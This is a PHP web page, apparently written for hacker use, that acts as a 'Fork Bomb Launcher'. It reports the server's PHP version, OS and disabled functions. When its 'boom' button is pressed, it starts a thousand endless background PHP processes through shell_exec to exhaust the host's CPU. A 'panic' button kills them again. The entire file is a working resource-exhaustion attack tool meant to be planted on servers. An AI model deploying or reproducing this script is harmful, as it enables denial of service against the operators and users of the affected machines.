<?php
//coded by 0x6ick - 6ickZone
//copyright 2025 by 6ickwhispers@gmail.com
$php_version = phpversion();
$disabled_functions = ini_get('disable_functions');
$os_info = php_uname();
$is_shell_exec_available = !in_array('shell_exec', array_map('trim', explode(',', $disabled_functions)));
$trigger = isset($_GET['boom']) && $is_shell_exec_available;
$panic = isset($_GET['panic']) && $is_shell_exec_available;

$status_message = '';

if ($trigger) {
    // Jalankan fork bomb
    for ($i = 0; $i < 1000; $i++) {
        shell_exec("php -r 'while(1){}' > /dev/null 2>&1 &");
    }
    $status_message = "💥 Fork bomb triggered!";
}

if ($panic) {
    // Kill semua proses PHP CLI infinite loop
    shell_exec("pkill -f \"php -r 'while(1){}'\"");
    $status_message = "🧹 Semua proses PHP zombie telah dibersihkan!";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>💣 Fork Bomb Terminal 💣</title>
    <style>
        body {
            background: black;
            color: #00ff00;
            font-family: monospace;
            padding: 20px;
        }
        .terminal {
            background: #111;
            border: 1px solid #0f0;
            padding: 15px;
            margin-top: 15px;
            max-height: 400px;
            overflow-y: auto;
        }
        .btn {
            background-color: red;
            color: white;
            font-weight: bold;
            padding: 10px 20px;
            margin-top: 10px;
            border: none;
            cursor: pointer;
        }
        .btn-panic {
            background-color: orange;
        }
    </style>
</head>
<body>

<h2>🔥 Fork Bomb Launcher 🔥</h2>

<div class="terminal" id="terminal">
    <p>PHP Version: <?= htmlspecialchars($php_version) ?></p>
    <p>OS: <?= htmlspecialchars($os_info) ?></p>
    <p>Disabled Functions: <?= htmlspecialchars($disabled_functions) ?: 'None' ?></p>
    <p>shell_exec(): <?= $is_shell_exec_available ? 'ENABLED ✅' : 'DISABLED ❌' ?></p>
    <?php if ($status_message): ?>
        <p style="color: red;"><?= htmlspecialchars($status_message) ?></p>
    <?php endif; ?>
</div>

<?php if ($trigger): ?>
    <script>
        const terminal = document.getElementById('terminal');
        let i = 0, limit = 100;

        function fakeOutput() {
            if (i < limit) {
                const line = document.createElement('p');
                line.textContent = `Spawning process [${i + 1}/${limit}]...`;
                terminal.appendChild(line);
                terminal.scrollTop = terminal.scrollHeight;
                i++;
                setTimeout(fakeOutput, 20);
            } else {
                const done = document.createElement('p');
                done.textContent = "🔥 Fork bomb triggered! Say goodbye to your CPU 💀";
                done.style.color = 'red';
                terminal.appendChild(done);
            }
        }

        fakeOutput();
    </script>

    <!-- Tombol PANIK -->
    <form method="get">
        <button name="panic" value="1" class="btn btn-panic">🆘 PANIK! KILL ALL!</button>
    </form>

<?php else: ?>
    <form method="get">
        <button name="boom" value="1" class="btn">💣 BOOMB!</button>
    </form>
<?php endif; ?>

</body>
</html>
